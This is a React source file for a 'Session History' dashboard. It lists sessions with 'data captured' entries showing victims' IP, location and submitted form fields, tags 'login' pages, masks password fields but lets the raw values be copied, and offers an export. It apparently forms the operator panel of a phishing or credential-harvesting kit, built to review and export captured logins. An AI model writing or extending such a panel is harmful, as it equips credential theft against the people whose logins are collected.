
import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Calendar, Download, Copy, Eye } from 'lucide-react';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { useSessionContext } from '@/contexts/SessionContext';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { cn } from '@/lib/utils';
import { toast } from '@/components/ui/sonner';

const History = () => {
  const { sessions, exportSessionData } = useSessionContext();
  const [viewingSessionData, setViewingSessionData] = useState<{ 
    sessionId: string, 
    data: Array<{ 
      timestamp: string; 
      ip: string; 
      location: string; 
      formData: Record<string, string>; 
    }> 
  } | null>(null);
  
  // Filter sessions that have data entries (simulating historical sessions)
  const historicalSessions = sessions.filter(session => session.data.length > 0);
  
  const formatDate = (dateString: string) => {
    const date = new Date(dateString);
    return new Intl.DateTimeFormat('en-US', {
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    }).format(date);
  };

  const viewSessionData = (sessionId: string) => {
    const session = sessions.find(s => s.id === sessionId);
    if (session) {
      setViewingSessionData({
        sessionId: session.id,
        data: session.data
      });
    }
  };

  const handleCopyFieldValue = (value: string) => {
    navigator.clipboard.writeText(value);
    toast.success("Value Copied", {
      description: "Field value has been copied to clipboard."
    });
  };

  return (
    <div className="container mx-auto animate-fade-in py-8">
      <div className="flex justify-between items-center mb-8">
        <div>
          <h1 className="text-3xl font-bold">Session History</h1>
          <p className="text-muted-foreground">View and analyze your past sessions</p>
        </div>
      </div>
      
      <div className="mb-8">
        {historicalSessions.length === 0 ? (
          <div className="bg-card rounded-lg p-8 text-center border">
            <div className="mb-4 text-muted-foreground">
              <Calendar className="h-12 w-12 mx-auto" />
            </div>
            <h3 className="text-lg font-medium mb-2">No session history</h3>
            <p className="text-muted-foreground mb-4">Your completed sessions with data will appear here</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {historicalSessions.map((session) => (
              <Card key={session.id} className="border shadow-sm">
                <CardHeader className="pb-3">
                  <div className="flex justify-between items-center">
                    <CardTitle className="text-lg font-medium">Session ID: {session.id}</CardTitle>
                    <Badge variant={session.mainPageId === 'login' ? 'default' : 'outline'} className={session.mainPageId === 'login' ? 'bg-brand-purple' : ''}>
                      {session.pageType || "Unknown"}
                    </Badge>
                  </div>
                  <div className="flex items-center text-xs text-muted-foreground mt-1">
                    <Calendar className="h-3 w-3 mr-1" />
                    <span>Created {formatDate(session.createdAt)}</span>
                  </div>
                </CardHeader>
                <CardContent className="pb-3">
                  <div className="mt-2 flex items-center">
                    <span className="text-sm font-medium">Data captured:</span>
                    <Badge variant="outline" className="ml-2">
                      {session.data.length} {session.data.length === 1 ? 'entry' : 'entries'}
                    </Badge>
                  </div>
                  <div className="mt-4 flex gap-2">
                    <Button
                      variant="secondary"
                      size="sm"
                      className="flex-1"
                      onClick={() => viewSessionData(session.id)}
                    >
                      <Eye className="h-4 w-4 mr-2" /> View Data
                    </Button>
                    <Button
                      variant="outline"
                      size="sm"
                      className="flex-1"
                      onClick={() => exportSessionData(session.id)}
                    >
                      <Download className="h-4 w-4 mr-2" /> Export Data
                    </Button>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}
      </div>

      {/* Data Viewing Dialog */}
      <Dialog open={!!viewingSessionData} onOpenChange={() => setViewingSessionData(null)}>
        <DialogContent className="max-w-3xl max-h-[80vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>Session Data: {viewingSessionData?.sessionId}</DialogTitle>
          </DialogHeader>
          {viewingSessionData?.data.length === 0 ? (
            <div className="text-center py-8">
              <p>No data has been captured for this session yet.</p>
            </div>
          ) : (
            <div className="space-y-6">
              {viewingSessionData?.data.map((entry, index) => (
                <Card key={index} className="border">
                  <CardHeader className="pb-2">
                    <div className="flex justify-between items-center">
                      <div className="text-sm text-muted-foreground">
                        Entry #{index + 1} • {formatDate(entry.timestamp)}
                      </div>
                      <Badge variant="outline" className="text-xs">
                        {entry.location}
                      </Badge>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-2">
                      {Object.entries(entry.formData).map(([key, value]) => (
                        <div key={key} className="grid grid-cols-12 gap-2 items-center">
                          <div className="col-span-4 font-medium text-sm">{key}:</div>
                          <div className="col-span-7 text-sm truncate">
                            {key.includes('password') ? '••••••••' : value}
                          </div>
                          <div className="col-span-1 flex justify-end">
                            <Button 
                              variant="ghost" 
                              size="icon" 
                              className="h-6 w-6" 
                              onClick={() => handleCopyFieldValue(value)}
                            >
                              <Copy className="h-3.5 w-3.5" />
                            </Button>
                          </div>
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default History;
